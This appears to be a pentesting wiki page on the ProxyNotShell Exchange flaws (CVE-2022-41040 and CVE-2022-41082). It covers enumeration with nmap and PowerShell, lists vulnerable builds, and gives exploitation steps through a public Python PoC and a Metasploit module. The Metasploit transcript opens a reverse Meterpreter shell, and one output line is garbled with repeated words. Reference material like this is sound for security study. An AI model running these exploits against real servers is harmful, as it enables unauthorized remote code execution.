---
description: Chained CVE-2022-41040, CVE-2022-41082
---

# ProxyNotShell

## Theory

ProxyNotShell is identified with the following CVEs: CVE-2022–41040 and CVE-2022–41082. The vulnerabilities affect Microsoft Exchange on premises with an **Outlook Web App.**

**CVE-2022-41040** : SSRF\
This vulnerability allow attackers to send an arbitrary request with a controlled URI and controlled data to an arbitrary backend service with LocalSystem privilege. (Request is very similar to the [ProxyShell](proxyshell.md) one)

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p><strong>CVE-2022-41040 - SSRF</strong><br></p></figcaption></figure>

**CVE-2022-41082** : RCE\
By abusing CVE-2022-41040 **authenticated** users may exploit CVE-2022-41082 to run arbitrary commands in vulnerable Exchange Servers.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p><strong>CVE-2022-41082</strong> - RCE Request</p></figcaption></figure>

## Practice

{% tabs %}
{% tab title="Enumerate" %}
We can use the [proxynotshell\_checker.nse](https://github.com/CronUp/Vulnerabilidades/blob/main/proxynotshell_checker.nse) nmap script to scan a target

```bash
nmap -p80,443 --script="proxynotshell_checker.nse" $IP

443/tcp open  https
    |_proxynotshell_checker: Potentially vulnerable to ProxyNotShell (mitigation not applied).
```

If we have local access to the target running exchange, we can check it version using the following powershell command:

```powershell
#Method 1
PS> GCM exsetup |%{$_.Fileversioninfo}

#Method 2
PS> (Get-Command ExSetup.exe).FileVersionInfo.ProductVersion

ProductVersion   FileVersion      FileName                                                                             
--------------   -----------      --------                                                                             
15.02.0858.005   15.2.1118.20   C:\Program Files\Microsoft\Exchange Server\V15\bin\ExSetup.exe
```

We can now search for the exact Microsoft Exchange product version using [this microsoft link](https://learn.microsoft.com/fr-fr/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019).\
\
Following versions are vulnerable :

| Version            | Vulnerable ProductVersion |
| ------------------ | ------------------------- |
| Exchange 2019 CU12 | < 15.2.1118.20            |
| Exchange 2019 CU11 | < 15.2.986.36             |
| Exchange 2016 CU23 | < 15.1.2507.16            |
| Exchange 2016 CU22 | < 15.1.2375.33            |
| Exchange 2013 CU23 | < 15.0.1497.32            |

{% hint style="info" %}
All versions before November 8, 2022 are vulnerable
{% endhint %}
{% endtab %}

{% tab title="Exploit" %}
We can use [testanull's python script](https://github.com/testanull/ProxyNotShell-PoC) to exploit this vulnerability

```bash
# Install dependecies
pip install requests_ntlm2 requests

#Exploit
python poc_aug3.py <host> <username> <password> <command>
```
{% endtab %}

{% tab title="Exploit - Metasploit" %}
A Metasploit module is available to exploit ProxyNotShell

{% hint style="info" %}
This exploit only support Exchange Server 2019
{% endhint %}

```bash
msf6 > use exploit/windows/http/exchange_proxynotshell_rce

msf6 exploit(windows/http/exchange_proxynotshell_rce) > set RHOSTS 192.168.159.11
RHOSTS => 192.168.159.11
msf6 exploit(windows/http/exchange_proxynotshell_rce) > set USERNAME aliddle
USERNAME => aliddle
msf6 exploit(windows/http/exchange_proxynotshell_rce) > set PASSWORD Password1!
PASSWORD => Password1!
msf6 exploit(windows/http/exchange_proxynotshell_rce) > exploit

[*] Started reverse TCP handler on 192.168.159.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (175686 bytes) to 192.168.159.11
[*] Meterpreter session 1 opened (192.168.159.128:4444 -> 1We can use the We can use the We can use theWe can use the92.168.159.11:7290) at 2022-11-18 17:32:18 -0500

meterpreter > 
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://www.rezilion.com/blog/proxyshell-or-proxynotshell-lets-set-the-record-straight/" %}

{% embed url="https://www.picussecurity.com/resource/blog/proxynotshellcve-2022-41040-and-cve-2022-41082-exploits-explained" %}
